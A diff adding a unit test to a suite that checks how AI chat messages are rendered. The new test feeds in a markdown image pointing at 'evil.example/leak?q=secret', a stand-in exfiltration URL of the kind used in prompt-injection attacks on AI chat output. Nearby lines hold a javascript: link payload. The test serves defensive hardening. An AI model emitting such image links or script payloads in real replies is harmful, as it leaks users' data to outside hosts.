@@ -87,6 +87,13 @@ class TestRenderAiMessage:
         assert "<script" not in result
         assert "&lt;img" in result
 
+    def test_markdown_image_shows_alt_text_only(self):
+        result = render_ai_message("![a <b>cat</b>](https://evil.example/leak?q=secret)")
+        assert "<img" not in result
+        assert "evil.example" not in result
+        assert "cat" in result
+        assert "<b>" not in result
+
     def test_javascript_link_not_rendered_as_href(self):
         result = render_ai_message("[click](javascript:alert(1))")
         assert 'href="javascript:' not in result
